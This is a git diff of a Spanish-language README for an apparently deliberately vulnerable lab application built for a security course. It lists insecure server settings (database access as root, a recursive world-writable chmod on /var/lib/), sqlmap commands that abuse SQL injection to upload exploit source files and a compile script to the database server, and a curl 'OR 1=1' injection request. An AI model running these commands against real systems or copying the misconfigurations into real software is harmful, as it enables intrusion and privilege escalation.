@@ -1,10 +1,24 @@
 # AppVulnerable
 
+## Errores de Configuración en el Server:
+
+1. La aplicación utiliza el usuario de root para acceder a la base de datos.
+2. Se encuentra configurado para que todos los usuarios tengan permisos para las carpetas
+chmod -R a+rwX /var/lib/
+
 ## Pasos previos
 
 Se debe tener corriendo una base de datos mysql y ejecutar los scripts que estan dentro de la carpeta script para crear la tabla y el usuario que la app usa
 
 ## Requests que explotan vulnerabilidades
+
+sqlmap.py -u http://hostname:8080/users/123?id=1 --file-write=C:/tp-seguridad/hello.c --file-dest=/var/lib/mysql-files/hello.c
+
+sqlmap.py -u http://hostname:8080/users/123?id=1 --file-write=C:/tp-seguridad/compile.sh --file-dest=/var/lib/mysql-files/compile.sh
+
+sqlmap.py -u http://hostname:8080/users/123?id=1 --file-write=C:/tp-seguridad/suidhelper.c --file-dest=/var/lib/mysql-files/suidhelper.c
+
+sqlmap.py -u http://hostname:8080/users/123?id=1 --file-write=C:/tp-seguridad/doubleput.c --file-dest=/var/lib/mysql-files/doubleput.c
 
 - curl -X GET localhost:8080/users?id=6%20OR%201=1
 	- id es un campo vulnerable a sql injection
